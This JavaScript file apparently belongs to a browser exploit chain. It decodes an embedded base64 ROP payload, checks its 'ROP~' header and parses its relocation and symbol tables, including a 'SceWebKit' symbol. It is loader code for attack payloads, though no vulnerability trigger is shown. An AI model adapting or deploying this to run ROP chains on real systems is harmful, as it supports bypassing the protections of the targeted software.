function check_rop_header(rop)
{
    var ropu32 = new Uint32Array(rop);
    
    if (ropu32[0] != 0x7E504F52)
        return false;
        
    if (ropu32[4/4] != 0x00010001)
        return false;
    
    return true;
}

// https://stackoverflow.com/questions/12710001/how-to-convert-uint8-array-to-base64-encoded-string/12713326#12713326
function Uint8ToString(u8a, begin, end){
  var CHUNK_SZ = 0x8000;
  var c = [];
  for (var i=begin; i < end; i+=CHUNK_SZ) {
    c.push(String.fromCharCode.apply(null, u8a.subarray(i, i+CHUNK_SZ)));
  }
  return c.join("").substring(0, end-begin);
}

// https://stackoverflow.com/questions/21797299/convert-base64-string-to-arraybuffer
function _base64ToArrayBuffer(base64) {
    var binary_string =  window.atob(base64);
    var len = binary_string.length;
    var padding = 4-(len % 4);
    var bytes = new Uint8Array( len+padding );
    for (var i = 0; i < len; i++)        {
        bytes[i] = binary_string.charCodeAt(i);
    }
    
    return bytes.buffer;
}

// https://stackoverflow.com/questions/9267899/arraybuffer-to-base64-encoded-string
function _arrayBufferToBase64( buffer ) {
    var binary = '';
    var bytes = new Uint8Array( buffer );
    var len = bytes.byteLength;
    for (var i = 0; i < len; i++) {
        binary += String.fromCharCode( bytes[ i ] );
    }
    return window.btoa( binary );
}

function rop_payload()
{
    var ropb64 = "Uk9QfgEAAQAAAAAAAAAAAAAAAAAAAAAAzc3Nzc3Nzc0YAAAAAAAAAIsEDAAAAAAAIAAAAAAAAAAIAAAAAAAAANkTAAAAAAAA2RMAALvNDwAAAAAAiwQMAAAAAABAAAAAAAAAAEgAAAAAAAAATAAAAAAAAABUAAAAAAAAAIAAAABTY2VXZWJLaXQA";
    
    var rop = _base64ToArrayBuffer(ropb64);
    var ropu8 = new Uint8Array(rop);
    var ropu16 = new Uint16Array(rop);
    var ropu32 = new Uint32Array(rop);
    
    var payload = {};
    
    var header_size = 0x40;
    payload.dsize = ropu32[0x10/4];
    payload.csize = ropu32[0x20/4];
    payload.reloc_size = ropu32[0x30/4];
    payload.symtab_size = ropu32[0x38/4];
    payload.reloc_map = {};
    
    payload.reloc_offset = header_size+payload.dsize+payload.csize;
    payload.symtab = header_size+payload.dsize+payload.csize+payload.reloc_size;
    payload.strtab = header_size+payload.dsize+payload.csize+payload.reloc_size+payload.symtab_size;
    
    if (check_rop_header(rop) == false)
    {
        alert("Invalid ROP header");
    }
    
    var symtab_n = (payload.symtab_size)/8;
    
    for (var i = 0; i < symtab_n; ++i)
    {
        var id = ropu32[(payload.symtab/4+(2*i))];
        var str_offset = ropu32[(payload.symtab/4+(2*i)+1)];
        
        var begin = str_offset;
        var end = str_offset;     
        while (ropu8[end] != 0) end++;
        var name = Uint8ToString(ropu8, begin, end);
        
        alert("got reloc: " + name);
        payload.reloc_map[id] = name;
    }
    
    payload.rop = rop;
    payload.u8 = ropu8;
    payload.u16 = ropu16;
    payload.u32 = ropu32;
    return payload;
}
